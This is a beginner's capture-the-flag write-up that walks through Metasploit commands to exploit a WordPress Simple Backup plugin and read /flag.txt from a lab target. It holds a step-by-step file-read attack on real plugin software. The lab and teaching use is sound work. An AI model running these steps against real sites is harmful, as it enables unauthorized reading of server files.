## First hack with Metasploit

## Objective
Identify services running on the server and find public exploits to retrieve the content of `/flag.txt`.

## Steps
I first open up the target in my browser to see what we are working with. I meet a webpage displaying the text "Simple Backup Plugin 2.7.10 for WordPress".

I search up "simple backup" on Metasploit to see if I get any hits on it. The rest I will show is the commands to this hack.
<br>

```
msf6 > search simple backup
```
<br>

```
msf6 > use 0
```
<br>

```
msf6 > options
```
<br>

```
msf6 > set RHOST *ip-adress
```
<br>

```
msf6 > set RPORT *port
```
<br>

*this is because the question is asking us to try and get the content of the /flag.txt
```
msf6 > set FILEPATH /flag.txt
```
<br>

```
msf6 > run
```
<br>


```
cd /home/kali/.msf4/loot
```
<br>

```
ls
```
<br>


```
cat *file that you have displayed with the ls command
```
<br>

And there you have your flag. Your first hack
